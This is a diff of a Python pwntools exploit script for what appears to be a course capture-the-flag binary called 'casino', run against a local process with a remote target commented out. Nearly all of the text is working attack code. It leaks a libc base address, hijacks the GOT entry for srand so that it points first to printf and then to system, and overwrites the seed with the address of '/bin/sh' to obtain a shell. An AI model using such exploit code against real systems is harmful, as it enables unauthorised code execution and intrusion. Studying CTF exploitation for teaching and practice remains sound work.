@@ -19,16 +19,18 @@ l.close()
 # calculate offset for system library
 elf = ELF('./casino')
 libc = ELF('./libc-2.23.so')
-binsh_offset = next(libc.search('/bin/sh')) # - libc.symbols['system']
+binsh_offset = next(libc.search('/bin/sh'))
+system_offset = libc.symbols['system']
 
-pop_call_offset = 0x107419
 main = 0x400564
 casino = 0x40095d
 name += p64(0x601ff0)
-printf = 0x602030
+# printf = 0x602030 --> has not fully solve, will crash
+printf = 0x400700 # fully resolved and back to printf again
 
-# libc_base_addr = ???? - 0x21ab0
+libc_base_addr = 0
 print(hex(binsh_offset))
+print(hex(system_offset))
 
 r = process("./casino")
 # r = remote('edu-ctf.csie.org', 10176)
@@ -56,7 +58,7 @@ while step < 10:
 
         step += 1
 
-    # Step 2: Write the rest of padding zeros in front of the starting address of casino
+    # Step 2: Write the rest of padding zeros in front of the starting address of step 1
     elif step == 2:
         cnt_num = 0
         for i in numbers:
@@ -75,7 +77,7 @@ while step < 10:
 
         step += 1
 
-    # Step 3: Hijack FOT table of srand, change it to print and use to leak system base address of libc
+    # Step 3: Hijack GOT table of srand, change it to print and use to leak system base address of libc
     elif step == 3:
         for i in range(0, 6):
             r_out = 'Chose the number ' + str(i) + ': '
@@ -93,7 +95,7 @@ while step < 10:
 
         step += 1
 
-    # Step 4: Write the rest of padding zeros in front of the starting address of printf
+    # Step 4: Write the rest of padding zeros in front of the starting address of step 3
     elif step == 4:
         cnt_num = 0
         for i in numbers:
@@ -107,15 +109,96 @@ while step < 10:
         r.sendlineafter('6]:', str(offset + 2))
 
         r_out = 'Chose the number ' + str(offset + 1) +': '
-        pause()
         r.sendlineafter(r_out, '0')
         print('finished sending number and payload for step  %d: ' % (step))
 
         step += 1
-    elif step == 5:
-        r.interactive()
-        r.close()
 
+    # Step 5: Hijack GOT table of srand, change it to system
+    elif step == 5:
+        libc_base_addr = u64(r.recv(6) + '\0\0') - 0x21ab0
+        print('get ASLR libc_base_addr: ', hex(libc_base_addr))
+        for i in range(0, 6):
+            r_out = 'Chose the number ' + str(i) + ': '
+            r.sendlineafter(r_out, str(i))
+
+        offset = (0x40 - 0xd0) / 4
+        r.sendlineafter('0:no]:', '1')
+
+        r.sendlineafter('6]:', str(offset + 1))
+
+        r_out = 'Chose the number ' + str(offset) +': '
+        hijack = libc_base_addr + system_offset
+        print('ASLR system_addr', hex(hijack))
+        r.sendlineafter(r_out, str(hijack)[:8])
+        print('finished sending number and payload for step  %d: ' % (step))
+
+        step += 1
+
+    # Step 6: Write the rest of padding zeros in front of the starting address of step 5
+    elif step == 6:
+        cnt_num = 0
+        numbers = [0x16, 0x43, 0x3a, 0x35, 0x4a, 0x3]
+        for i in numbers:
+            r_out = 'Chose the number ' + str(cnt_num) + ': '
+            r.sendlineafter(r_out, str(i))
+            cnt_num += 1
+
+        offset = (0x40 - 0xd0) / 4
+        r.sendlineafter('0:no]:', '1')
+
+        r.sendlineafter('6]:', str(offset + 2))
+
+        r_out = 'Chose the number ' + str(offset + 1) +': '
+        hijack = libc_base_addr + system_offset
+        pause()
+        r.sendlineafter(r_out, str(hijack)[8:])
+        print('finished sending number and payload for step  %d: ' % (step))
+        step += 1
+
+    # Step 7: Overwrite seed to where /bin/sh locates, for eventually system('/bin/sh')
+    elif step == 7:
+        for i in range(0, 6):
+            r_out = 'Chose the number ' + str(i) + ': '
+            r.sendlineafter(r_out, str(i))
+
+        offset = (0x100 - 0xd0) / 4
+        r.sendlineafter('0:no]:', '1')
+
+        r.sendlineafter('6]:', str(offset + 1))
+
+        r_out = 'Chose the number ' + str(offset) +': '
+        hijack = libc_base_addr + binsh_offset
+        print('ASLR system_addr', hex(hijack))
+        r.sendlineafter(r_out, str(hijack)[8:])
+        print('finished sending number and payload for step  %d: ' % (step))
+
+        step += 1
+
+    # Step 7: Write the rest of padding zeros in front of the starting address of step 7
+    elif step == 8:
+        cnt_num = 0
+        numbers = [0x16, 0x43, 0x3a, 0x35, 0x4a, 0x3]
+        for i in numbers:
+            r_out = 'Chose the number ' + str(cnt_num) + ': '
+            r.sendlineafter(r_out, str(i))
+            cnt_num += 1
+
+        offset = (0x100 - 0xd0) / 4
+        r.sendlineafter('0:no]:', '1')
+
+        r.sendlineafter('6]:', str(offset + 2))
+
+        r_out = 'Chose the number ' + str(offset + 1) +': '
+        hijack = libc_base_addr + binsh_offset
+        r.sendlineafter(r_out, str(hijack)[:8])
+        print('finished sending number and payload for step  %d: ' % (step))
+
+        step += 1
+
+    elif step == 9:
+        r.close()
+        break
 r.interactive()
 r.close()
 
